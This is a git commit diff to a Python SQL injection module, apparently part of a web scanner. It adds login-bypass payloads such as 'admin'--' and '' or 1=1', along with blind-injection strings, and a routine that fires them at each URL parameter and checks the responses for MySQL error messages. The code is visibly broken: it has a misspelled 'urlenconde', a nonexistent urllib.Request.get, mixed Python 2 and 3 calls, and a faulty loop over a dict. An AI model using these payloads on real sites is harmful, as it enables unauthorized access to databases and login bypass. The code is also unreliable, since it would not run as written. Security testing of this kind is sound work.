73ce870769223be50442c0b758729755ef2e2308
0xJCG <jonathancastrogonzalez@gmail.com>
2015-11-11 17:51:34 +0100

    Blind SQL injection only waits for SQL updates.

--- App/modules/sqlinjection/sql_injection.py
+++ App/modules/sqlinjection/sql_injection.py
@@ -14,7 +14,31 @@ class SQLInjection(object):
     def __init__(self, urls):
         self.urls = urls
         # http://stackoverflow.com/questions/9626535/get-domain-name-from-url
-        #self.domain = "{0.scheme}://{0.netloc}/".format(urllib.parse.urlsplit(url))
+        # self.domain = "{0.scheme}://{0.netloc}/".format(urllib.parse.urlsplit(url))
+
+        self.input_data = [
+            urllib.urlencode({
+                'username': 'admin\'--',
+                'password': '123456789'}),
+            urllib.urlencode({
+                'username': '\' or 1=1',
+                'password': '123456789'}),
+            urllib.urlencode({
+                'username': 'admin',
+                'password': '\'or \'1\'=\'1'}),
+        ]
+
+        self.blind_param_data = [
+            'A%\'--',
+            'A%\' and 1=1--',
+            'A%\' and 1=2--'
+        ]
+
+        # self.serialized_param_data = []
+
+        self.sql_errors = {
+            'MySQL': 'error in your SQL syntax'
+        }
 
     def search_injections(self):
         while True:
@@ -23,7 +47,7 @@ class SQLInjection(object):
                 break
             self.__signin_attemp(url)
             self.__blind_sqli(url)
-            self.__serialized_sqli(url)
+            # self.__serialized_sqli(url)
 
     def __signin_attemp(self, url):
         soup = BeautifulSoup(url.get_content())
@@ -40,11 +64,22 @@ class SQLInjection(object):
         return False
 
     def __blind_sqli(self, url):
-        params = self.__get_parameters(url)
+        params = self.__get_parameters(url.get_url())
+        domain = "{0.scheme}://{0.netloc}/".format(urllib.parse.urlsplit(url.get_url()))
+        for x, y in params:
+            for p in self.blind_param_data:
+                data = {
+                    x: p
+                }
+                req = urllib.Request.get(domain, data=urllib.urlenconde(data))
+                response = urllib.urlopen(req)
+                for t, e in self.sql_errors:
+                    if e in response.lower():
+                        return True
         return False
 
     def __serialized_sqli(self, url):
-        params = self.__get_parameters(url)
+        # params = self.__get_parameters(url)
         return False
 
     def __get_parameters(self, url):
